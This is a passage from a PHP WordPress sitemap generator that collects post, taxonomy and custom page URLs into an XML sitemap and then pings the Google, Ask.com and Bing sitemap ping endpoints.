                                $this->AddUrl($subPage, $this->GetTimestampFromMySql(($post->post_modified_gmt && $post->post_modified_gmt != '0000-00-00 00:00:00' ? $post->post_modified_gmt : $post->post_date_gmt)), ($isPage ? $cf_pages : $cf_posts), $prio);
                            }
                        }
                    }

                    //Update the status every 100 posts and at the end.
                    //If the script breaks because of memory or time limit,
                    //we have a "last reponded" value which can be compared to the server settings
                    if ($zz == 100 || $z == $postCount) {
                        $zz = 0;
                    } else
                        $zz++;

                    $z++;

                    //Clean cache because it's incomplete
                    if (version_compare($wp_version, "2.5", ">=")) {
                        //WP 2.5 makes a mysql query for every clean_post_cache to clear the child cache
                        //so I've copied the function here until a patch arrives...
                        wp_cache_delete($post->ID, 'posts');
                        wp_cache_delete($post->ID, 'post_meta');
                        clean_object_term_cache($post->ID, 'post');
                    } else {
                        clean_post_cache($post->ID);
                    }
                }
                unset($postRes);
                unset($prioProvider);
            }
        }

        //Add custom taxonomy pages
        if (true) {

            $taxList = array();

            foreach (get_taxonomies() as $taxName) {
                if (!in_array($taxName, array('nav_menu', 'link_category', 'post_format'))) {

                    $taxonomy = get_taxonomy($taxName);

                    if (isset($taxonomy->labels->name) && trim($taxonomy->labels->name) != '') {
                        if (!tfuse_options('seo_xmls_exclude_taxonomy_' . $taxName, false) && 'STOP!' != tfuse_options('seo_xmls_exclude_taxonomy_' . $taxName, 'STOP!')) {
                            if ($taxonomy)
                                $taxList[] = $wpdb->escape($taxonomy->name);
                        }
                    }
                }
            }

            if (count($taxList) > 0) {
                //We're selecting all term information (t.*) plus some additional fields
                //like the last mod date and the taxonomy name, so WP doesnt need to make
                //additional queries to build the permalink structure.
                //This does NOT work for categories and tags yet, because WP uses get_category_link
                //and get_tag_link internally and that would cause one additional query per term!
                $sql = "
					SELECT
						t.*,
						tt.taxonomy AS _taxonomy,
						UNIX_TIMESTAMP(MAX(post_date_gmt)) as _mod_date
					FROM
						{$wpdb->posts} p ,
						{$wpdb->term_relationships} r,
						{$wpdb->terms} t,
						{$wpdb->term_taxonomy} tt
					WHERE
						p.ID = r.object_id
						AND p.post_status = 'publish'
						AND p.post_password = ''
						AND r.term_taxonomy_id = t.term_id
						AND t.term_id = tt.term_id
						AND tt.count > 0
						AND tt.taxonomy IN ('" . implode("','", $taxList) . "')
					GROUP BY 
						t.term_id";

                $termInfo = $wpdb->get_results( $sql );

                foreach ($termInfo AS $term) {
                    if (!in_array($term->_taxonomy, array('nav_menu', 'link_category', 'post_format'))) {
                        $this->AddUrl(get_term_link($term->slug, $term->_taxonomy), $term->_mod_date, $this->GetOption("cf_tags"), $this->GetOption("pr_tags"));
                    }
                }
            }
        }

        //Add the custom pages
        if ($this->_pages && is_array($this->_pages) && count($this->_pages) > 0) {
            //#type $page TF_SEO_SitemapGeneratorPage
            foreach ($this->_pages AS $page) {
                $this->AddUrl($page->GetUrl(), $page->getLastMod(), $page->getChangeFreq(), $page->getPriority());
            }
        }

        do_action('tf_seo_buildmap');

        $this->AddElement(new TF_SEO_SitemapGeneratorXmlEntry("</urlset>"));


        $pingUrl = '';

        if (true) {
            if ($this->_fileHandle && fclose($this->_fileHandle)) {
                $this->_fileHandle = null;
                $pingUrl = $this->GetXmlUrl();
            }
        }

        if ($this->IsGzipEnabled()) {
            if ($this->_fileZipHandle && fclose($this->_fileZipHandle)) {
                $this->_fileZipHandle = null;
                $pingUrl = $this->GetZipUrl();
            }
        }

        //Ping Google
        if (!empty($pingUrl)) {
            $sPingUrl = "http://www.google.com/webmasters/sitemaps/ping?sitemap=" . urlencode($pingUrl);
            $pingres = $this->RemoteOpen($sPingUrl);

            if ($pingres == NULL || $pingres === false) {
                trigger_error("Failed to ping Google: " . htmlspecialchars(strip_tags($pingres)), E_USER_NOTICE);
            }
        }

        //Ping Ask.com
        if (!empty($pingUrl)) {
            $sPingUrl = "http://submissions.ask.com/ping?sitemap=" . urlencode($pingUrl);
            $pingres = $this->RemoteOpen($sPingUrl);

            if ($pingres == NULL || $pingres === false || strpos($pingres, "successfully received and added") === false) { //Ask.com returns 200 OK even if there was an error, so we need to check the content.
                trigger_error("Failed to ping Ask.com: " . htmlspecialchars(strip_tags($pingres)), E_USER_NOTICE);
            }
        }

        //Ping Bing
        if (!empty($pingUrl)) {
            $sPingUrl = "http://www.bing.com/webmaster/ping.aspx?siteMap=" . urlencode($pingUrl);
            $pingres = $this->RemoteOpen($sPingUrl);
            //Bing returns ip/country-based success messages, so there is no way to check the content. Rely on HTTP 500 only then...
            if ($pingres == NULL || $pingres === false || strpos($pingres, " ") === false) {
                trigger_error("Failed to ping Bing: " . htmlspecialchars(strip_tags($pingres)), E_USER_NOTICE);
            }
        }


        $this->_isActive = false;

        //done...
        return;
    }

}
